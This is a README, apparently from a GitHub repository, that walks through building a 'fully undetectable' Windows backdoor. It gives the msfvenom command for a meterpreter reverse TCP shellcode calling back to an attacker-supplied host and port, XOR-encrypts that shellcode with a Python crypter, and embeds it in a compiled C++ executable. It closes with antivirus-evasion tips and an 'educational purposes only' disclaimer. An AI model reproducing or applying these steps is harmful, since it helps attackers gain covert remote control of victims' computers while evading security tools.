# 🔒 Generate **FUD** backdoor with a Python **Crypter** 🔒
Follow the steps bellow to generate a crypted shellcode that can be used on a C++ executable.

## Clone the repository
```
sudo git clone https://github.com/3ct0s/fud-backdoor.git
cd fud-backdoor
```

## Generate The ShellCode

```
msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=(IP) LPORT=(PORT) -f raw -o raw.txt
```

## Encode the ShellCode With the XOR Encryption

```
python xor_encryptor.py raw.txt > xor_shellcode.txt
```

## Add the crypted shellcode on main.cpp
Now that you have the encrypted shellcode you need to add it on the main.cpp file just like this:
```
char b[] = /*xor_shellcode*/
```

## Compile the main.cpp file
There is no specific way to do this, all you need to do is compile the C++ code into a windows executable. Here are ways to do that.
https://cutt.ly/BBOXP797

## Execute the backdoor
Now you can execute the backdoor and enjoy the metepreter shell

## What is it gets detected?

At some point, the anti viruses will be able to detect this backdoor. Here are some things you can do to make it undetectable again. 

You can try to change the payload type protocol and make it http or https and make sure to use another port, add gibberish C++ code on the main.cpp file and you can also try playing with the SSL certificate of the session. Here is an article that covers this: https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation

If this still doesn't work, I can't think of another way to make the connection undetectable since this is a meterpreter shell and they get detected quite easily

## DISCLAIMER

I am not responsible for any of your actions. This GitHub repository is made for educational purposes only!!!
